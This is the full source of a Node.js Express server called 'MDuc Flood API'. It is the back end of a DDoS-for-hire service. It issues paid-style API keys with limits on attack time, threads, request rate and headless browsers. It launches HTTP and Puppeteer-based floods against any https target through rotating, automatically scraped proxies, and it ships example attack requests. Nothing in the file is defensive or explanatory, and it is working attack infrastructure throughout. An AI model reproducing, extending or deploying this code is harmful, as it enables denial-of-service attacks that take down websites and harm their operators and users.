const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');
const crypto = require('crypto');
const randomstring = require('randomstring');

const app = express();
const PORT = process.env.PORT || 3000;

// ==================== CẤU HÌNH ====================
const API_KEYS_FILE = path.join(__dirname, 'apikey.json');
const PROXY_FILE = process.env.PROXY_FILE || "proxy.txt";
const APP_NAME = "MDuc Flood API";
// ==================================================

app.use(cors());
app.use(express.json());

let activeAttacks = new Map();
let apiKeysData = loadApiKeys();
let dailyUsage = {};

// Middleware kiểm tra API key
function authenticate(req, res, next) {
    const apiKey = req.headers['x-api-key'] || req.query.api_key;
    
    if (!apiKey) {
        return res.status(401).json({ 
            error: "API key is required",
            app: APP_NAME
        });
    }
    
    // Kiểm tra owner key
    if (apiKey === apiKeysData.owner_key) {
        req.isOwner = true;
        req.apiKey = apiKey;
        req.keyData = {
            name: "OWNER",
            max_time: 999999,
            max_threads: 999,
            max_rate: 9999,
            max_concurrent: 999,
            daily_limit: 99999,
            max_browsers: 50,
            allowed_options: ["*"]
        };
        return next();
    }
    
    const keyData = apiKeysData.api_keys[apiKey];
    if (!keyData) {
        return res.status(401).json({ 
            error: "Invalid API key",
            app: APP_NAME
        });
    }
    
    // Kiểm tra hạn sử dụng
    if (keyData.expires_at && new Date(keyData.expires_at) < new Date()) {
        delete apiKeysData.api_keys[apiKey];
        saveApiKeys();
        return res.status(401).json({ 
            error: "API key has expired",
            app: APP_NAME
        });
    }
    
    // Kiểm tra daily limit
    const today = new Date().toISOString().split('T')[0];
    dailyUsage[today] = dailyUsage[today] || {};
    dailyUsage[today][apiKey] = dailyUsage[today][apiKey] || { count: 0, last_reset: Date.now() };
    
    if (dailyUsage[today][apiKey].count >= keyData.daily_limit) {
        return res.status(429).json({ 
            error: "Daily limit exceeded",
            limit: keyData.daily_limit,
            used: dailyUsage[today][apiKey].count,
            app: APP_NAME
        });
    }
    
    // Kiểm tra số lượng tấn công đồng thời
    let concurrentCount = 0;
    for (const [_, attack] of activeAttacks) {
        if (attack.apiKey === apiKey) {
            concurrentCount++;
        }
    }
    
    if (concurrentCount >= keyData.max_concurrent) {
        return res.status(429).json({ 
            error: "Maximum concurrent attacks reached",
            max_concurrent: keyData.max_concurrent,
            current: concurrentCount,
            app: APP_NAME
        });
    }
    
    req.isOwner = false;
    req.apiKey = apiKey;
    req.keyData = keyData;
    next();
}

// Middleware chỉ dành cho owner
function ownerOnly(req, res, next) {
    if (!req.isOwner) {
        return res.status(403).json({ 
            error: "Owner access required",
            app: APP_NAME
        });
    }
    next();
}

// ==================== API ENDPOINTS ====================

// 1. Thông tin API
app.get('/api/v1/info', (req, res) => {
    res.json({
        app: APP_NAME,
        version: apiKeysData.settings.version || "2.0.0",
        endpoints: {
            public: ["/api/v1/info", "/api/v1/system/status"],
            authenticated: ["/api/v1/attack/*", "/api/v1/key/info", "/api/v1/attacks/active"],
            owner_only: ["/api/v1/key/*", "/api/v1/attacks/all", "/api/v1/system/diagnostics"]
        },
        features: [
            "DDoS Attack API",
            "Multi-threaded requests",
            "Browser-based attacks (Puppeteer)",
            "Proxy rotation",
            "Rate limiting",
            "API key management"
        ]
    });
});

// 2. Tạo API key mới (Owner only)
app.post('/api/v1/key/create', authenticate, ownerOnly, (req, res) => {
    const { 
        name = "New API Key",
        max_time = apiKeysData.settings.default_max_time,
        max_threads = apiKeysData.settings.default_max_threads,
        max_rate = apiKeysData.settings.default_max_rate,
        max_concurrent = apiKeysData.settings.default_max_concurrent,
        max_browsers = apiKeysData.settings.default_max_browsers,
        daily_limit = apiKeysData.settings.default_daily_limit,
        expires_in_days = 30,
        allowed_options = []
    } = req.body;
    
    const apiKey = crypto.randomBytes(32).toString('hex');
    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + expires_in_days);
    
    apiKeysData.api_keys[apiKey] = {
        name,
        created_at: new Date().toISOString(),
        expires_at: expiresAt.toISOString(),
        max_time: parseInt(max_time),
        max_threads: parseInt(max_threads),
        max_rate: parseInt(max_rate),
        max_browsers: parseInt(max_browsers),
        max_concurrent: parseInt(max_concurrent),
        daily_limit: parseInt(daily_limit),
        allowed_options: Array.isArray(allowed_options) ? allowed_options : [],
        total_used: 0,
        created_by: req.apiKey
    };
    
    saveApiKeys();
    
    res.json({
        success: true,
        app: APP_NAME,
        api_key: apiKey,
        key_info: apiKeysData.api_keys[apiKey],
        message: "API key created successfully"
    });
});

// 3. Bắt đầu tấn công (Hỗ trợ --browser option)
app.post('/api/v1/attack/start', authenticate, (req, res) => {
    const { target, time, threads, rate, browser, options = [] } = req.body;
    const { apiKey, keyData, isOwner } = req;
    
    // Validate input
    if (!target || !time || !threads || !rate) {
        return res.status(400).json({ 
            error: "Missing required parameters: target, time, threads, rate",
            app: APP_NAME
        });
    }
    
    if (!target.startsWith('https://')) {
        return res.status(400).json({ 
            error: "Target must start with https://",
            app: APP_NAME
        });
    }
    
    // Validate limits (trừ owner)
    if (!isOwner) {
        if (parseInt(time) > keyData.max_time) {
            return res.status(400).json({ 
                error: `Time exceeds maximum allowed (${keyData.max_time} seconds)`,
                app: APP_NAME
            });
        }
        
        if (parseInt(threads) > keyData.max_threads) {
            return res.status(400).json({ 
                error: `Threads exceeds maximum allowed (${keyData.max_threads})`,
                app: APP_NAME
            });
        }
        
        if (parseInt(rate) > keyData.max_rate) {
            return res.status(400).json({ 
                error: `Rate exceeds maximum allowed (${keyData.max_rate} req/s)`,
                app: APP_NAME
            });
        }
        
        // Validate browser limit nếu có browser option
        if (browser && parseInt(browser) > keyData.max_browsers) {
            return res.status(400).json({ 
                error: `Browser count exceeds maximum allowed (${keyData.max_browsers})`,
                app: APP_NAME
            });
        }
    }
    
    // Xử lý options
    let finalOptions = [...options];
    
    // Thêm --browser nếu có
    if (browser) {
        finalOptions.push(`--browser ${parseInt(browser)}`);
    }
    
    // Validate allowed options (trừ owner)
    if (!isOwner && finalOptions.length > 0) {
        const invalidOptions = finalOptions.filter(opt => {
            const optName = opt.split(' ')[0];
            // Kiểm tra nếu option không được phép
            return !keyData.allowed_options.includes(optName) && 
                   !keyData.allowed_options.includes('*') &&
                   !apiKeysData.settings.allowed_browser_options.includes(optName);
        });
        
        if (invalidOptions.length > 0) {
            return res.status(400).json({ 
                error: `Options not allowed: ${invalidOptions.join(', ')}`,
                app: APP_NAME
            });
        }
    }
    
    // Kiểm tra file proxy
    const proxyPath = path.join(__dirname, PROXY_FILE);
    if (!fs.existsSync(proxyPath)) {
        return res.status(500).json({ 
            error: "Proxy file not found",
            app: APP_NAME
        });
    }
    
    // Build command args
    const phantomPath = path.join(__dirname, 'script.js');
    const cmdArgs = [
        phantomPath,
        target,
        time.toString(),
        threads.toString(),
        rate.toString(),
        PROXY_FILE,
        ...finalOptions
    ];
    
    // Sử dụng xvfb-run nếu có browser option
    const useXvfb = finalOptions.some(opt => opt.includes('--browser'));
    const cmd = useXvfb ? 'xvfb-run' : 'node';
    const fullArgs = useXvfb 
        ? ['-a', 'node', ...cmdArgs]
        : cmdArgs;
    
    // Spawn process
    const child = spawn(cmd, fullArgs, {
        cwd: __dirname,
        stdio: ['ignore', 'pipe', 'pipe'],
        detached: true,
        env: { 
            ...process.env, 
            FORCE_COLOR: '0',
            DISPLAY: useXvfb ? ':99' : undefined,
            PUPPETEER_EXECUTABLE_PATH: useXvfb ? '/usr/bin/google-chrome-stable' : undefined
        }
    });
    
    const attackId = `${apiKey}_${Date.now()}_${randomstring.generate(8)}`;
    const today = new Date().toISOString().split('T')[0];
    
    // Cập nhật daily usage (trừ owner)
    if (!isOwner) {
        dailyUsage[today][apiKey].count++;
        apiKeysData.api_keys[apiKey].total_used++;
        saveApiKeys();
    }
    
    // Lưu thông tin tấn công
    activeAttacks.set(attackId, {
        process: child,
        target,
        startTime: Date.now(),
        duration: parseInt(time),
        apiKey,
        attackId,
        childPid: child.pid,
        isOwner,
        threads: parseInt(threads),
        rate: parseInt(rate),
        browser: browser ? parseInt(browser) : null,
        options: finalOptions
    });
    
    // Capture output để gửi realtime (optional)
    let attackOutput = "";
    child.stdout.on('data', (data) => {
        attackOutput += data.toString();
    });
    
    child.stderr.on('data', (data) => {
        attackOutput += data.toString();
    });
    
    // Auto stop sau thời gian
    setTimeout(() => {
        if (activeAttacks.has(attackId)) {
            const attack = activeAttacks.get(attackId);
            try {
                process.kill(-attack.process.pid, 'SIGINT');
            } catch (e) {
                try {
                    attack.process.kill('SIGINT');
                } catch (e) {}
            }
            activeAttacks.delete(attackId);
        }
    }, (parseInt(time) + 10) * 1000);
    
    res.json({
        success: true,
        app: APP_NAME,
        attack_id: attackId,
        message: "Attack started successfully",
        details: {
            target,
            duration: parseInt(time),
            threads: parseInt(threads),
            rate: parseInt(rate),
            browser: browser ? parseInt(browser) : 'Not used',
            options: finalOptions,
            method: useXvfb ? 'Browser-based (Xvfb)' : 'HTTP Flood',
            estimated_completion: new Date(Date.now() + (time * 1000)).toISOString(),
            api_key: apiKey.substring(0, 8) + '...'
        }
    });
});

// 4. Ví dụ tấn công với browser
app.get('/api/v1/attack/example', (req, res) => {
    res.json({
        app: APP_NAME,
        example_requests: [
            {
                method: "POST",
                endpoint: "/api/v1/attack/start",
                headers: {
                    "X-API-Key": "your_api_key_here",
                    "Content-Type": "application/json"
                },
                body: {
                    target: "https://example.com",
                    time: 60,
                    threads: 10,
                    rate: 90,
                    browser: 5,
                    options: ["--randpath", "--reset"]
                },
                description: "Browser-based attack with 5 concurrent browsers"
            },
            {
                method: "POST",
                endpoint: "/api/v1/attack/start",
                headers: {
                    "X-API-Key": "your_api_key_here",
                    "Content-Type": "application/json"
                },
                body: {
                    target: "https://target.com",
                    time: 120,
                    threads: 20,
                    rate: 150
                },
                description: "Standard HTTP flood attack"
            },
            {
                method: "POST",
                endpoint: "/api/v1/attack/start",
                headers: {
                    "X-API-Key": "your_api_key_here",
                    "Content-Type": "application/json"
                },
                body: {
                    target: "https://target.com",
                    time: 300,
                    threads: 30,
                    rate: 200,
                    browser: 10,
                    options: ["--randpath", "--debug", "--close"]
                },
                description: "Advanced browser attack with debugging"
            }
        ]
    });
});

// 5. Cập nhật API key với browser limits (Owner only)
app.put('/api/v1/key/update/:apiKey', authenticate, ownerOnly, (req, res) => {
    const { apiKey } = req.params;
    const updates = req.body;
    
    if (!apiKeysData.api_keys[apiKey]) {
        return res.status(404).json({ 
            error: "API key not found",
            app: APP_NAME
        });
    }
    
    // Cập nhật các trường được phép
    const allowedFields = ['max_time', 'max_threads', 'max_rate', 'max_concurrent', 
                          'daily_limit', 'max_browsers', 'allowed_options', 'expires_at'];
    
    allowedFields.forEach(field => {
        if (updates[field] !== undefined) {
            apiKeysData.api_keys[apiKey][field] = updates[field];
        }
    });
    
    saveApiKeys();
    
    res.json({
        success: true,
        app: APP_NAME,
        key_info: apiKeysData.api_keys[apiKey],
        message: "API key updated successfully"
    });
});

// 6. Get attack details
app.get('/api/v1/attack/details/:attackId', authenticate, (req, res) => {
    const { attackId } = req.params;
    const { apiKey, isOwner } = req;
    
    const attack = activeAttacks.get(attackId);
    
    if (!attack) {
        return res.status(404).json({ 
            error: "Attack not found or completed",
            app: APP_NAME
        });
    }
    
    if (!isOwner && attack.apiKey !== apiKey) {
        return res.status(403).json({ 
            error: "Not authorized to view this attack",
            app: APP_NAME
        });
    }
    
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    const remaining = Math.max(0, attack.duration - elapsed);
    const progress = ((elapsed / attack.duration) * 100).toFixed(1);
    
    res.json({
        app: APP_NAME,
        attack_id: attackId,
        target: attack.target,
        status: 'running',
        progress: `${progress}%`,
        elapsed_seconds: elapsed,
        remaining_seconds: remaining,
        details: {
            threads: attack.threads,
            rate: attack.rate,
            browser: attack.browser,
            options: attack.options,
            start_time: new Date(attack.startTime).toISOString(),
            estimated_completion: new Date(attack.startTime + (attack.duration * 1000)).toISOString(),
            api_key: attack.apiKey.substring(0, 8) + '...'
        }
    });
});

// 7. Test browser connection
app.get('/api/v1/system/test-browser', authenticate, (req, res) => {
    const { isOwner } = req;
    
    if (!isOwner) {
        return res.status(403).json({ 
            error: "Owner access required for browser testing",
            app: APP_NAME
        });
    }
    
    // Test Chrome installation
    try {
        const chromeCheck = execSync('which google-chrome-stable', { encoding: 'utf8' }).trim();
        const chromeVersion = execSync('google-chrome-stable --version', { encoding: 'utf8' }).trim();
        
        // Test Xvfb
        const xvfbCheck = execSync('which Xvfb', { encoding: 'utf8' }).trim();
        
        // Test Puppeteer
        const puppeteerTest = `
            const puppeteer = require('puppeteer-real-browser');
            console.log('Puppeteer loaded successfully');
        `;
        
        fs.writeFileSync('/tmp/test_puppeteer.js', puppeteerTest);
        const puppeteerCheck = execSync('node /tmp/test_puppeteer.js', { encoding: 'utf8' }).trim();
        
        res.json({
            success: true,
            app: APP_NAME,
            browser: {
                chrome: {
                    installed: true,
                    path: chromeCheck,
                    version: chromeVersion
                },
                xvfb: {
                    installed: xvfbCheck ? true : false,
                    path: xvfbCheck
                },
                puppeteer: {
                    installed: puppeteerCheck.includes('successfully'),
                    test_output: puppeteerCheck
                }
            },
            message: "Browser dependencies are ready for attacks"
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            app: APP_NAME,
            error: error.message,
            message: "Browser dependencies test failed"
        });
    }
});

// ==================== CÁC ENDPOINTS CŨ (cập nhật tên app) ====================

// Stop attack
app.post('/api/v1/attack/stop/:attackId', authenticate, (req, res) => {
    const { attackId } = req.params;
    const { apiKey, isOwner } = req;
    
    const attack = activeAttacks.get(attackId);
    
    if (!attack) {
        return res.status(404).json({ 
            error: "Attack not found",
            app: APP_NAME
        });
    }
    
    if (!isOwner && attack.apiKey !== apiKey) {
        return res.status(403).json({ 
            error: "Not authorized to stop this attack",
            app: APP_NAME
        });
    }
    
    try {
        const pid = attack.process.pid;
        if (pid) {
            try {
                process.kill(-pid, 'SIGINT');
            } catch (e) {
                attack.process.kill('SIGINT');
            }
        }
        activeAttacks.delete(attackId);
        
        res.json({ 
            success: true,
            app: APP_NAME,
            message: "Attack stopped successfully" 
        });
    } catch (error) {
        res.status(500).json({ 
            error: "Failed to stop attack",
            app: APP_NAME
        });
    }
});

// Get active attacks for user
app.get('/api/v1/attacks/active', authenticate, (req, res) => {
    const { apiKey } = req;
    
    const attacks = [];
    for (const [attackId, attack] of activeAttacks) {
        if (attack.apiKey === apiKey) {
            const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
            const remaining = Math.max(0, attack.duration - elapsed);
            
            attacks.push({
                attack_id: attackId,
                target: attack.target,
                elapsed_seconds: elapsed,
                remaining_seconds: remaining,
                threads: attack.threads,
                rate: attack.rate,
                browser: attack.browser,
                start_time: new Date(attack.startTime).toISOString()
            });
        }
    }
    
    res.json({
        app: APP_NAME,
        total_active: attacks.length,
        max_concurrent: req.keyData.max_concurrent,
        attacks: attacks
    });
});

// Get API key info
app.get('/api/v1/key/info', authenticate, (req, res) => {
    const { apiKey, keyData, isOwner } = req;
    const today = new Date().toISOString().split('T')[0];
    
    res.json({
        app: APP_NAME,
        api_key: apiKey.substring(0, 8) + '...',
        key_info: {
            ...keyData,
            daily_used: dailyUsage[today]?.[apiKey]?.count || 0,
            remaining_daily: Math.max(0, keyData.daily_limit - (dailyUsage[today]?.[apiKey]?.count || 0))
        },
        limits: {
            max_time: keyData.max_time,
            max_threads: keyData.max_threads,
            max_rate: keyData.max_rate,
            max_browsers: keyData.max_browsers || 5,
            max_concurrent: keyData.max_concurrent,
            daily_limit: keyData.daily_limit,
            allowed_options: keyData.allowed_options
        }
    });
});

// System status
app.get('/api/v1/system/status', (req, res) => {
    const os = require('os');
    
    res.json({
        app: APP_NAME,
        version: apiKeysData.settings.version,
        system: {
            uptime: Math.floor(process.uptime()),
            memory_usage: {
                total: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + ' GB',
                free: (os.freemem() / 1024 / 1024 / 1024).toFixed(2) + ' GB',
                used_percent: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1) + '%'
            },
            cpu_load: os.loadavg().map(l => l.toFixed(2)),
            platform: os.platform(),
            arch: os.arch()
        },
        attacks: {
            total_active: activeAttacks.size,
            total_api_keys: Object.keys(apiKeysData.api_keys).length
        }
    });
});

// Proxy list
app.get('/api/v1/proxy/list', authenticate, (req, res) => {
    const proxyPath = path.join(__dirname, PROXY_FILE);
    
    if (!fs.existsSync(proxyPath)) {
        return res.status(404).json({ 
            error: "Proxy file not found",
            app: APP_NAME
        });
    }
    
    fs.readFile(proxyPath, 'utf8', (err, data) => {
        if (err) {
            return res.status(500).json({ 
                error: "Failed to read proxy file",
                app: APP_NAME
            });
        }
        
        const proxies = data.split('\n').filter(l => l.trim());
        
        res.json({
            app: APP_NAME,
            total_proxies: proxies.length,
            proxies: proxies.slice(0, 100)
        });
    });
});

// ==================== HELPER FUNCTIONS ====================

function loadApiKeys() {
    try {
        if (fs.existsSync(API_KEYS_FILE)) {
            const data = fs.readFileSync(API_KEYS_FILE, 'utf8');
            return JSON.parse(data);
        } else {
            // Tạo file mới với owner key
            const defaultData = {
                owner_key: crypto.randomBytes(32).toString('hex'),
                api_keys: {},
                settings: {
                    app_name: APP_NAME,
                    version: "2.0.0",
                    default_max_time: 300,
                    default_max_threads: 20,
                    default_max_rate: 100,
                    default_max_concurrent: 3,
                    default_daily_limit: 10,
                    default_max_browsers: 5,
                    proxy_file: "proxy.txt",
                    allowed_browser_options: ["--browser", "--randpath", "--reset", "--debug", "--close"]
                }
            };
            fs.writeFileSync(API_KEYS_FILE, JSON.stringify(defaultData, null, 2));
            console.log(`[${APP_NAME}] Created new API keys file with owner key`);
            return defaultData;
        }
    } catch (error) {
        console.error('Error loading API keys:', error);
        return { 
            owner_key: "", 
            api_keys: {}, 
            settings: { app_name: APP_NAME } 
        };
    }
}

function saveApiKeys() {
    try {
        fs.writeFileSync(API_KEYS_FILE, JSON.stringify(apiKeysData, null, 2));
    } catch (error) {
        console.error('Error saving API keys:', error);
    }
}

// Reset daily usage mỗi ngày
setInterval(() => {
    const today = new Date().toISOString().split('T')[0];
    const yesterday = new Date(Date.now() - 86400000).toISOString().split('T')[0];
    
    if (dailyUsage[yesterday]) {
        delete dailyUsage[yesterday];
    }
    
    dailyUsage[today] = dailyUsage[today] || {};
}, 3600000);

// Khởi động API server
app.listen(PORT, () => {
    console.log(`🚀 ${APP_NAME} running on port ${PORT}`);
    console.log(`👑 Owner Key: ${apiKeysData.owner_key.substring(0, 8)}...`);
    console.log(`📁 Total API keys: ${Object.keys(apiKeysData.api_keys).length}`);
    console.log(`🌐 Example: POST /api/v1/attack/start with browser option`);
    
    // Tự động chạy proxy scraper
    startProxyScraper();
});

function startProxyScraper() {
    const proxyScript = path.join(__dirname, 'proxy.js');
    
    const runScraper = () => {
        console.log(`[${APP_NAME}] Updating proxy list...`);
        const child = spawn('node', [proxyScript, '--silent'], {
            cwd: __dirname,
            detached: true,
            stdio: 'ignore'
        });
        child.unref();
    };
    
    runScraper();
    setInterval(runScraper, 10 * 60 * 1000);
}
